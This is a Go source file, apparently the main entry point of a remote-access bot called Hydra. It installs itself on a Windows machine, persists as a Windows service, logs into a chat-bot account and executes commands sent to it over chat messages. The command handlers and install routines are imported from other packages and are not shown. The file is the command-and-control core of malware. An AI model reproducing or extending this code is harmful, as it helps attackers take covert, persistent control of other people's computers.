package main

import (
	"log"
	"os"

	"github.com/Raffy27/Hydra/api"
	"github.com/Raffy27/Hydra/commands"
	"github.com/Raffy27/Hydra/install"
	"github.com/Raffy27/Hydra/util"
	"golang.org/x/sys/windows/svc"
)

func main() {

	//Check single instance
	util.CheckSingle()

	if !install.IsInstalled() {
		log.Println("No previous install detected. Installing")
		install.Install()
	} else {
		log.Println("Already installed")
	}

	if os.Getenv("poly") == "" {
		if chk, _ := svc.IsWindowsService(); chk {
			install.HandleService(main)
		}
	}

	log.Println("Logged in as", api.Bot.Self.UserName)
	//api.NewGenesis()
	log.Println("Genesis is", api.Genesis)
	//go api.Heartbeat()
	for u := range api.Updates {
		if u.Message == nil {
			continue
		}
		log.Printf("[%s] %s", u.Message.From.UserName, u.Message.Text)
		if u.Message.IsCommand() {
			commands.Perform(u.Message)
		}
	}
}
